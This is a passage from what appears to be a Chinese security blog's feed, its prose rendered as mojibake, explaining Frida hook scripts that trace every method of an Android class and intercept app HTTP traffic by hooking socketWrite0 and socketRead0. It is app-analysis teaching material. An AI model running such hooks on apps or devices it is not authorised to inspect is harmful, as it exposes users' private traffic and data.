å›å»éå†æ‰€æœ‰çš„classloader,å¹¶å°†å½“å‰ä½¿ç”¨çš„classloaderè®¾ç½®ä¸ºåŒ…å«ç›®æ ‡ç±»çš„classloader</p><p>2ã€éå†è¿™ä¸ªclassloaderæ‰€æœ‰çš„ç±»,æ»¡è¶³é»‘ç™½åå•çš„æƒ…å†µä¸‹,å°†ç±»åæ¨å…¥<code>targetClasses</code></p><h2 id="traceClass-JavaTraceClass"><a href="#traceClass-JavaTraceClass" class="headerlink" title="traceClass&amp;JavaTraceClass"></a>traceClass&amp;JavaTraceClass</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">traceClass</span>(<span class="params">targetClass</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Java</span>.<span class="property">available</span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="title class_">JavaTraceClass</span>(targetClass)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title class_">ObjC</span>.<span class="property">available</span>) &#123;</span><br><span class="line">        <span class="title class_">IosTraceClass</span>(targetClass)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;please connect to either iOS or Android device ...&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">JavaTraceClass</span>(<span class="params">targetClass</span>) &#123;</span><br><span class="line">    <span class="comment">//Java.useæ˜¯æ–°å»ºä¸€ä¸ªå¯¹è±¡å“ˆï¼Œå¤§å®¶è¿˜è®°å¾—ä¹ˆï¼Ÿ</span></span><br><span class="line">    <span class="keyword">var</span> hook = <span class="title class_">Java</span>.<span class="title function_">use</span>(targetClass);</span><br><span class="line">    <span class="comment">//åˆ©ç”¨åå°„çš„æ–¹å¼ï¼Œæ‹¿åˆ°å½“å‰ç±»çš„æ‰€æœ‰æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">var</span> methods = hook.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line">    <span class="comment">//å»ºå®Œå¯¹è±¡ä¹‹åè®°å¾—å°†å¯¹è±¡é‡Šæ”¾æ‰å“ˆ</span></span><br><span class="line">    hook.<span class="property">$dispose</span>;</span><br><span class="line">    <span class="comment">//å°†æ–¹æ³•åä¿å­˜åˆ°æ•°ç»„ä¸­</span></span><br><span class="line">    <span class="keyword">var</span> parsedMethods = [];</span><br><span class="line">    <span class="keyword">var</span> output = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    output = output.<span class="title function_">concat</span>(<span class="string">&quot;\tSpec: =&gt; \r\n&quot;</span>)</span><br><span class="line">    methods.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">method</span>) &#123;</span><br><span class="line">        output = output.<span class="title function_">concat</span>(method.<span class="title function_">toString</span>())</span><br><span class="line">        output = output.<span class="title function_">concat</span>(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">        parsedMethods.<span class="title function_">push</span>(method.<span class="title function_">toString</span>().<span class="title function_">replace</span>(targetClass + <span class="string">&quot;.&quot;</span>, <span class="string">&quot;TOKEN&quot;</span>).<span class="title function_">match</span>(<span class="regexp">/\sTOKEN(.*)\(/</span>)[<span class="number">1</span>]);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">//å»æ‰ä¸€äº›é‡å¤çš„å€¼</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Targets</span> = <span class="title function_">uniqBy</span>(parsedMethods, <span class="title class_">JSON</span>.<span class="property">stringify</span>);</span><br><span class="line">    <span class="comment">// targets = [];</span></span><br><span class="line">    <span class="keyword">var</span> constructors = hook.<span class="property">class</span>.<span class="title function_">getDeclaredConstructors</span>();</span><br><span class="line">    <span class="keyword">if</span> (constructors.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        constructors.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">constructor</span>) &#123;</span><br><span class="line">            output = output.<span class="title function_">concat</span>(<span class="string">&quot;Tracing &quot;</span>, constructor.<span class="title function_">toString</span>())</span><br><span class="line">            output = output.<span class="title function_">concat</span>(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="title class_">Targets</span> = <span class="title class_">Targets</span>.<span class="title function_">concat</span>(<span class="string">&quot;$init&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¯¹æ•°ç»„ä¸­æ‰€æœ‰çš„æ–¹æ³•è¿›è¡Œhookï¼Œ</span></span><br><span class="line">    <span class="title class_">Targets</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">targetMethod</span>) &#123;</span><br><span class="line">        <span class="title function_">traceMethod</span>(targetClass + <span class="string">&quot;.&quot;</span> + targetMethod);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">//ç”»ä¸ªæ¨ªçº¿</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> p = <span class="number">0</span>; p &lt; <span class="number">100</span>; p++) &#123;</span><br><span class="line">        output = output.<span class="title function_">concat</span>(<span class="string">&quot;+&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title class_">Green</span>(output);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯æ‰¾åˆ°<code>targetClass</code>ä¸‹æ‰€æœ‰çš„æ–¹æ³•å’Œæ„é€ æ–¹æ³•,å¯¹æ¯ä¸ªæ–¹æ³•éƒ½æ‰§è¡Œ<code>traceMethod</code></p><h2 id="traceMethod"><a href="#traceMethod" class="headerlink" title="traceMethod"></a>traceMethod</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// traceå•ä¸ªç±»çš„æ‰€æœ‰é™æ€å’Œå®ä¾‹æ–¹æ³•åŒ…æ‹¬æ„é€ æ–¹æ³• trace a specific Java Method</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">traceMethod</span>(<span class="params">targetClassMethod</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> delim = targetClassMethod.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (delim === -<span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">var</span> targetClass = targetClassMethod.<span class="title function_">slice</span>(<span class="number">0</span>, delim)</span><br><span class="line">    <span class="keyword">var</span> targetMethod = targetClassMethod.<span class="title function_">slice</span>(delim + <span class="number">1</span>, targetClassMethod.<span class="property">length</span>)</span><br><span class="line">    <span class="keyword">var</span> hook = <span class="title class_">Java</span>.<span class="title function_">use</span>(targetClass);</span><br><span class="line">    <span class="keyword">if</span> (!hook[targetMethod]) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> overloadCount = hook[targetMethod].<span class="property">overloads</span>.<span class="property">length</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title class_">Red</span>(<span class="string">&quot;Tracing Method : &quot;</span> + targetClassMethod + <span class="string">&quot; [&quot;</span> + overloadCount + <span class="string">&quot; overload(s)]&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; overloadCount; i++) &#123;</span><br><span class="line">        hook[targetMethod].<span class="property">overloads</span>[i].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="comment">//åˆå§‹åŒ–è¾“å‡º</span></span><br><span class="line">            <span class="keyword">var</span> output = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="comment">//ç”»ä¸ªæ¨ªçº¿</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> p = <span class="number">0</span>; p &lt; <span class="number">100</span>; p++) &#123;</span><br><span class="line">                output = output.<span class="title function_">concat</span>(<span class="string">&quot;==&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//åŸŸå€¼</span></span><br><span class="line">            <span class="keyword">if</span> (!isLite) &#123; output = <span class="title function_">inspectObject</span>(<span class="variable language_">this</span>, output); &#125;</span><br><span class="line">            <span class="comment">//è¿›å…¥å‡½æ•°</span></span><br><span class="line">            output = output.<span class="title function_">concat</span>(<span class="string">&quot;\n*** entered &quot;</span> + targetClassMethod);</span><br><span class="line">            output = output.<span class="title function_">concat</span>(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">            <span class="comment">// if (arguments.length) console.Black();</span></span><br><span class="line">            <span class="comment">//å‚æ•°</span></span><br><span class="line">            <span class="keyword">var</span> retval = <span class="variable language_">this</span>[targetMethod].<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">            <span class="keyword">if</span> (!isLite) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; j++) &#123;</span><br><span class="line">                    output = output.<span class="title function_">concat</span>(<span class="string">&quot;arg[&quot;</span> + j + <span class="string">&quot;]: &quot;</span> + <span class="variable language_">arguments</span>[j] + <span class="string">&quot; =&gt; &quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">arguments</span>[j]));</span><br><span class="line">                    output = output.<span class="title function_">concat</span>(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//è°ƒç”¨æ ˆ</span></span><br><span class="line">                output = output.<span class="title function_">concat</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()));</span><br><span class="line">                <span class="comment">//è¿”å›å€¼</span></span><br><span class="line">                output = output.<span class="title function_">concat</span>(<span class="string">&quot;\nretval: &quot;</span> + retval + <span class="string">&quot; =&gt; &quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(retval));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// inspectObject(this)</span></span><br><span class="line">            <span class="comment">//ç¦»å¼€å‡½æ•°</span></span><br><span class="line">            output = output.<span class="title function_">concat</span>(<span class="string">&quot;\n*** exiting &quot;</span> + targetClassMethod);</span><br><span class="line">            <span class="comment">//æœ€ç»ˆè¾“å‡º</span></span><br><span class="line">            <span class="comment">// console.Black(output);</span></span><br><span class="line">            <span class="keyword">var</span> r = <span class="built_in">parseInt</span>((<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">7</span>).<span class="title function_">toFixed</span>(<span class="number">0</span>));</span><br><span class="line">            <span class="keyword">var</span> i = r;</span><br><span class="line">            <span class="keyword">var</span> printOutput = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">switch</span> (i) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    printOutput = <span class="variable language_">console</span>.<span class="property">Red</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                    printOutput = <span class="variable language_">console</span>.<span class="property">Yellow</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                    printOutput = <span class="variable language_">console</span>.<span class="property">Green</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                    printOutput = <span class="variable language_">console</span>.<span class="property">Cyan</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                    printOutput = <span class="variable language_">console</span>.<span class="property">Blue</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                    printOutput = <span class="variable language_">console</span>.<span class="property">Gray</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="attr">default</span>:</span><br><span class="line">                    printOutput = <span class="variable language_">console</span>.<span class="property">Purple</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_">printOutput</span>(output);</span><br><span class="line">            <span class="keyword">return</span> retval;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œæ‰“å°ç±»çš„æˆå‘˜çš„å€¼,å’Œè¿½è¸ªæ–¹æ³•çš„å…¥å‚å’Œå‡ºå‚çš„å€¼,å¹¶æ‰“å°å‡ºè°ƒç”¨å †æ ˆ</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> r0trace </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>R0captureå…³é”®ä»£ç å­¦ä¹ </title>
      <link href="/2024/10/25/R0capture%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/10/25/R0capture%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒå‰é¢R0captureçš„ä»£ç ï¼Œå…·ä½“é€šè¿‡æ¡ˆä¾‹æ¥åˆ†ææŠ“åŒ…çš„åŸç†å’Œå…³é”®æºç çš„è¿½è¸ªã€‚ä¸»è¦åŒ…å«ä¸‹é¢å†…å®¹ï¼š</p><ul><li>Http Request</li><li>Http Response</li><li>Https Request</li><li>Https Response</li></ul><h1 id="HookæŠ“åŒ…åŸç†-å…³é”®ç‚¹æºç è¿½è¸ªï¼ˆHTTP-requestï¼‰"><a href="#HookæŠ“åŒ…åŸç†-å…³é”®ç‚¹æºç è¿½è¸ªï¼ˆHTTP-requestï¼‰" class="headerlink" title="HookæŠ“åŒ…åŸç†&amp;å…³é”®ç‚¹æºç è¿½è¸ªï¼ˆHTTP requestï¼‰"></a>HookæŠ“åŒ…åŸç†&amp;å…³é”®ç‚¹æºç è¿½è¸ªï¼ˆHTTP requestï¼‰</h1><h2 id="demo-å®ç°httpè¯·æ±‚"><a href="#demo-å®ç°httpè¯·æ±‚" class="headerlink" title="demo-å®ç°httpè¯·æ±‚"></a>demo-å®ç°httpè¯·æ±‚</h2><p>åˆ›å»ºä¸€ä¸ªhttpsockå‡½æ•°ï¼Œæœ¬è´¨å°±æ˜¯ç®€å•çš„javaä»£ç ï¼Œé€šè¿‡socketå®ç°å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯é€šä¿¡</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//http://www.dtasecurity.cn:18080/demo01/getNotice</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">httpsock</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> <span class="string">&quot;www.dtasecurity.cn&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">18080</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/demo01/getNotice&quot;</span>;</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(host,port);  <span class="comment">//åˆ›å»ºsocketå¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        sb.append(<span class="string">&quot;GET &quot;</span>+path+<span class="string">&quot; HTTP/1.1\r\n&quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;user-Agent: test\r\n&quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;Host: &quot;</span>+host+<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        Log.d(<span class="string">&quot;DTA===&gt;&quot;</span>, sb.toString());</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> socket.getOutputStream();   <span class="comment">//å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œæ‹¼æ¥å¥½ä¹‹åè°ƒç”¨socketå‘é€åˆ°æœåŠ¡ç«¯</span></span><br><span class="line">        outputStream.write(sb.toString().getBytes());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è¿™å—åŒä¸Šï¼Œæ¥æ”¶æœåŠ¡ç«¯çš„è¿”å›æ•°æ®</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> len;</span><br><span class="line">        <span class="keyword">while</span>( ( len = inputStream.read(buffer,<span class="number">0</span>,buffer.length) ) != -<span class="number">1</span> )&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;DTA===&gt;&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(Arrays.copyOf(buffer,len)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281727585.png" alt="image.png"> </p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>æ ¹æ®ä»£ç å¯ä»¥çœ‹åˆ°è¿™å—æ˜¯è°ƒç”¨äº† <code>outputStream</code> çš„ write æ–¹æ³•ï¼Œå®ç°å°†æ•°æ®ä¼ é€åˆ°ç®¡é“ä¸­çš„ã€‚ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281745951.png" alt="image.png"> </p><p>è·Ÿè¿›åˆ°writeæ–¹æ³•ä¸­ï¼Œå¯ä»¥çœ‹åˆ°è°ƒç”¨byte[]æ•°æ®ï¼Œè¿›è¡Œæ•°æ®å†™å…¥ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281746180.png" alt="image.png"> </p><p>è¿™å— outputStream æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼ŒæŠ½è±¡ç±»æ˜¯ä¸èƒ½ç›´æ¥hookçš„ï¼Œæ‰€ä»¥è¿™å—éœ€è¦æ‰¾åˆ°  outputStream çš„å®ç°ç±»ã€‚ã€‚</p><p>å¦‚ä½•æ‰¾åˆ°å®ƒå¯¹åº”çš„å®ç°ç±»å‘¢ï¼Ÿ</p><p>è¿™å—å¯ä»¥åœ¨ <code>outputStream.write</code> å¤„ä¸‹æ–­ç‚¹ï¼Œdebugè°ƒè¯•æ‰¾åˆ°å®ƒçš„å…·ä½“å®ç°ç±»ä¸ºï¼š<strong>SocketOutputStream</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281747938.png" alt="image.png"> </p><p>æ‰€ä»¥ï¼Œè¿™å—å¯ä»¥æŸ¥æ‰¾ä¸‹  <strong>SocketOutputStream</strong> ä¸­çš„writeæ–¹æ³•ï¼Œå‚æ•°ç±»å‹ä¸ºbyte</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281747549.png" alt="image.png"> </p><p>è°ƒç”¨äº† socketWrite æ–¹æ³•ï¼Œç»§ç»­å¾€ä¸‹è·Ÿã€‚å¯ä»¥çœ‹åˆ°çœŸæ­£è°ƒç”¨çš„æ˜¯tryä¸­åŒ…è£¹çš„<strong>socketWrite0</strong>æ–¹æ³•</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281747182.png" alt="image.png"> </p><p>è·Ÿè¿›socketWrite0 æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°è¿™å—ä¿®é¥°ç¬¦å¤šäº†ä¸ª <strong>native</strong>ï¼Œè¿™æ˜¯å› ä¸ºå‡½æ•°ä¸æ˜¯åœ¨javaå±‚å®ç°çš„ï¼Œå®ƒçš„å®ç°åœ¨soå±‚ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281748180.png" alt="image.png"> </p><h2 id="æ‰‹å†™R0captureçš„Hookä»£ç "><a href="#æ‰‹å†™R0captureçš„Hookä»£ç " class="headerlink" title="æ‰‹å†™R0captureçš„Hookä»£ç "></a>æ‰‹å†™R0captureçš„Hookä»£ç </h2><p>è¿™å—æ ¹æ®ä¸Šé¢çš„åˆ†æé€»è¾‘ï¼Œå¯¹ Http Requestè°ƒç”¨çš„ <code>SocketOutputStream</code>ä¸­çš„<code>socketWrite0</code>å‡½æ•°è¿›è¡Œhookï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Start!&quot;</span>) </span><br><span class="line">        <span class="comment">//hook SocketOutputStreamä¸­çš„socketWrite0å‡½æ•°</span></span><br><span class="line">        <span class="comment">//è¿™å—çš„ç›®çš„å°±æ˜¯æ‹¿åˆ°å‡½æ•°ä¸­çš„å‚æ•° bytes</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.net.SocketOutputStream&quot;</span>).<span class="property">socketWrite0</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">fd,bytes,off,len</span>)&#123;</span><br><span class="line">            <span class="comment">//æ‰“å°äº†å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯åœ°å€</span></span><br><span class="line">            <span class="keyword">var</span> localAddress = <span class="variable language_">this</span>.<span class="property">socket</span>.<span class="property">value</span>.<span class="title function_">getLocalAddress</span>().<span class="title function_">toString</span>()</span><br><span class="line">            <span class="keyword">var</span> remoteAddress = <span class="variable language_">this</span>.<span class="property">socket</span>.<span class="property">value</span>.<span class="title function_">getRemoteSocketAddress</span>().<span class="title function_">toString</span>()</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(localAddress +<span class="string">&quot;====&gt;&quot;</span>+ remoteAddress)</span><br><span class="line">           </span><br><span class="line">            <span class="comment">//è¿™å—é€šè¿‡è‡ªå®šä¹‰hexdumpå‡½æ•°ï¼Œè·å–è¾“å…¥çš„byteå†…å®¹</span></span><br><span class="line">            <span class="title function_">hexdump</span>(bytes,off,len)</span><br><span class="line">        </span><br><span class="line">            <span class="title function_">showStacks</span>()</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">socketWrite0</span>(fd,bytes,off,len)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è°ƒç”¨è¯¥å‡½æ•°ï¼Œå¯ä»¥å®ç°å°†å†…å­˜ä¸­çš„ byte è½¬æ¢ä¸º String</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">hexdump</span>(<span class="params">bytearry,offset,length</span>)&#123;</span><br><span class="line">            <span class="comment">// bytearray =&gt; [B</span></span><br><span class="line">            <span class="comment">// offset =&gt; I</span></span><br><span class="line">            <span class="comment">// length =&gt; I</span></span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">HexDump</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.internal.util.HexDump&quot;</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">HexDump</span>.<span class="title function_">dumpHexString</span>(bytearry,offset,length))</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="comment">//æ‰“å°å®ƒçš„è°ƒç”¨æ ˆ</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>).$new()));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281749149.png" alt="image.png"> </p><h1 id="Http-response"><a href="#Http-response" class="headerlink" title="Http response"></a>Http response</h1><h2 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>åŒç†ï¼Œå¯¹ç…§æºç ï¼Œå¯ä»¥çœ‹åˆ°è¿™å—æ˜¯è°ƒç”¨<code>inputStream.read</code>æ–¹æ³•æ¥è·å–httpçš„responseçš„ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281750549.png" alt="img"> </p><p>inputStream.readå’Œ outputStream.writeæ–¹æ³•æ˜¯å¯¹åº”å…³ç³»ï¼Œè¿™å—å¯ä»¥å¤§èƒ†çŒœæµ‹ä¸€ä¸‹ï¼ŒinputStreamçš„å®ç°ç±»æ˜¯<strong>SocketIntputStream</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281751591.png" alt="image.png"> </p><p>åœ¨å®ƒçš„é‡Œé¢ï¼Œä¹Ÿæ˜¯æœ‰<strong>socketRead0</strong>æ–¹æ³•çš„ï¼Œæˆ‘ä»¬è¿™å—hookï¼Œä¹Ÿæ˜¯hookçš„è¿™ä¸ªæ–¹æ³•</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281751308.png" alt="image.png"> </p><h2 id="hookä»£ç "><a href="#hookä»£ç " class="headerlink" title="hookä»£ç "></a>hookä»£ç </h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//http response</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                 <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.net.SocketInputStream&quot;</span>).<span class="property">socketRead0</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">fd,bytes,off,len,timeout</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Intercepted socket read&quot;</span>);                              </span><br><span class="line">        <span class="comment">//æ‰“å°äº†å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯åœ°å€</span></span><br><span class="line">        <span class="keyword">var</span> localAddress = <span class="variable language_">this</span>.<span class="property">socket</span>.<span class="property">value</span>.<span class="title function_">getLocalAddress</span>().<span class="title function_">toString</span>()</span><br><span class="line">        <span class="keyword">var</span> remoteAddress = <span class="variable language_">this</span>.<span class="property">socket</span>.<span class="property">value</span>.<span class="title function_">getRemoteSocketAddress</span>().<span class="title function_">toString</span>()</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(remoteAddress +<span class="string">&quot;&lt;====&quot;</span>+ localAddress)</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ‰“å°äº†è¯»å–çš„æ•°æ®</span></span><br><span class="line">        <span class="title function_">hexdump</span>(bytes,off,len);</span><br><span class="line"></span><br><span class="line">        <span class="title function_">showStacks</span>() ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">socketRead0</span>(fd,bytes,off,len,timeout);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//è°ƒç”¨è¯¥å‡½æ•°ï¼Œå¯ä»¥å®ç°å°†å†…å­˜ä¸­çš„ byte è½¬æ¢ä¸º String</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hexdump</span>(<span class="params">bytearry,offset,length</span>)&#123;</span><br><span class="line">    <span class="comment">// bytearray =&gt; [B</span></span><br><span class="line">    <span class="comment">// offset =&gt; I</span></span><br><span class="line">    <span class="comment">// length =&gt; I</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">HexDump</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span 